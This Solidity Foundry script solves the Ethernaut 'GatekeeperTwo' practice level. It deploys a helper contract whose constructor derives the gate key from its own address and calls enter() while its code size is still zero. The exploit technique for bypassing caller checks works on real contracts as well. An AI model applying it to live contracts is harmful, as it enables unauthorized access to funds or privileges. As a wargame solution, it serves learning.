// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { GatekeeperTwo } from "./Problem.sol";

contract Solution {
    constructor(GatekeeperTwo gatekeeper) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        gatekeeper.enter(key);
    }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        GatekeeperTwo gatekeeper = GatekeeperTwo(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution(gatekeeper);
        vm.stopBroadcast();

        assert(gatekeeper.entrant() == tx.origin);
    }

    function getLevelAddress() internal view override returns(address) {
        return 0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d;
    }
}

